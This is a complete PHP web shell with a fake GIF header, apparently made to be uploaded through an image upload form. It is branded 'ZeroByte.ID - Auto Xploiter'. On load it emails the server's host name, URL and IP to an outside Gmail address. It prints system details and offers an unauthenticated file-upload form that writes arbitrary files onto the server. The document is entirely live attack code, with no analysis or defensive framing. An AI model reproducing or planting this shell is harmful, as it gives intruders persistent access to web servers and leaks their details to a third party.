GIF89;a<?php
mail("xsuxhaxdax99@gmail.com","Shell From ".$_SERVER['HTTP_HOST'],"Direct Link : ".$_SERVER['SERVER_NAME']."".$_SERVER['REQUEST_URI']."\nInfo : ".$info."\nIP : ".$_SERVER['SERVER_ADDR']."\n");
echo "ZeroByte.ID - Auto Xploiter";
echo "<br>".php_uname()."<br>";
echo "<form method='post' enctype='multipart/form-data'>
<input type='file' name='idx'><input type='submit' name='upload' value='upload'>
</form>";
if($_POST['upload']) {
	if(@copy($_FILES['idx']['tmp_name'], $_FILES['idx']['name'])) {
	echo "sukses";
	} else {
	echo "gagal";
	}
}
?>